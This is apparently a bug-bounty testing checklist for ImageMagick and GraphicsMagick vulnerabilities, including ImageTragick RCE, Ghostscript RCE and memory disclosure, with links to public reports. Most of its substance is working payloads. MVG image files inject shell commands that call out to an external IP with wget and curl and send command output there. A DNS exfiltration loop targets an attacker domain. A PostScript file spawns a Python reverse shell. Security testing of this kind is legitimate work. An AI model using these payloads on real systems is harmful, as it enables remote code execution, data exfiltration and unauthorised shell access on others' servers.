# Image Magic / Graphics Magic vulnerabilities

- [ ] Anywhere where we can upload a picture, check for Image Tragic. Especially in profile picture uploads when we see a cropped version of the picture.

- [ ] Check for RCE (CVE-2016-3714)
  - https://hackerone.com/reports/135072

x.gif
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 167.71.9.74:1337 > /dev/null`'
pop graphic-context
```

  - https://web.archive.org/web/20190104220048/https://nahamsec.com/exploiting-imagemagick-on-yahoo/

x.png
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id | curl http://167.71.9.74:1337/ -d @- > /dev/null`'
pop graphic-context
```

- [ ] Firewalls could be blocking certain requests. Try exfiltration through DNS.
  - https://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html
  
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60for i in $(ls /) ; do curl "http://$i.attacker.tld/" -d @- > /dev/null; done`'
pop graphic-context
```  
  
- [ ] Check if we are able to edit an uploaded image. Does the request contain arguments? If the backend is using GraphicsMagic, we could inject commands.
  - https://hackerone.com/reports/212696

- [ ] If there is no validation on the file type and Ghostscript is enabled we could get RCE
  - https://hackerone.com/reports/422944

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("167.71.9.74",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

- [ ] Check if we can disclose server memory through image magic (CVE-2017-15277, CVE-2018-16323)
  - https://hackerone.com/reports/302885
  - https://hackerone.com/reports/251732
  - https://hackerone.com/reports/274594
  - https://hackerone.com/reports/315256
  - https://medium.com/@ilja.bv/yet-another-memory-leak-in-imagemagick-or-how-to-exploit-cve-2018-16323-a60f048a1e12
